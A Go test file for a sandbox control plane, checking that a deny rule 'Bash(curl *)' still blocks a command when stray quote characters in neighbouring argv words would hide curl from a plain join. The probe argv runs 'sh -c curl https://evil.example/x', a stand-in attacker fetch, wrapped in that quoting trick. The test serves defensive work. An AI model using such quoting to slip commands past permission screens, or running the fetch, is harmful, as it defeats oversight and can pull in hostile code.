package server

import (
	"encoding/json"
	"net/http"
	"testing"

	"github.com/zybuu-ai/abhed/controlplane"
	"github.com/zybuu-ai/abhed/wsconn"
)

// probeArgv runs curl through sh -c, with quotes in the words around it that
// a plain join of the words would pair up, hiding curl from the screen.
var probeArgv = []string{"env", "A='", "sh", "-c", "curl https://evil.example/x", "B='"}

// An argv exec is screened and recorded as the quoted line the driver runs,
// so a deny rule sees the words that run, on POST :exec and its WebSocket.
func TestSandboxExecScreensTheQuotedArgv(t *testing.T) {
	r := newWSRig(t, nil, nil, func(o *Options) { o.Config.Permissions.Deny = []string{"Bash(curl *)"} })
	sb := r.ready(t, "alice")
	body, _ := json.Marshal(controlplane.ExecRequest{Argv: probeArgv})
	rec := r.do(t, cpCall{method: "POST", path: "/v1/sandboxes/" + sb.ID + ":exec", token: "alice", body: string(body)})
	if rec.Code != http.StatusForbidden || errCode(t, rec) != "forbidden" {
		t.Fatalf("POST :exec: %d %s", rec.Code, rec.Body.String())
	}
	ev := waitAudit(t, r.cpRig, sb.ID, "exec", controlplane.OutcomeFailed)
	if want := r.svc.Redact(`env "A='" sh -c 'curl https://evil.example/x' "B='"`); ev.Detail["command"] != want {
		t.Fatalf("recorded %q, want %q", ev.Detail["command"], want)
	}
	ws, err := r.dial(t, "alice", "/v1/sandboxes/"+sb.ID+":exec", protoExec)
	if err != nil {
		t.Fatal(err)
	}
	_ = ws.WriteMessage(wsconn.Text, body)
	if c, _ := control(t, ws); c.Type != "error" || c.Error.Code != "forbidden" {
		t.Fatalf("WebSocket :exec %+v", c)
	}
	if r.fake.Calls("exec") != 0 {
		t.Fatal("a refused command ran")
	}
}
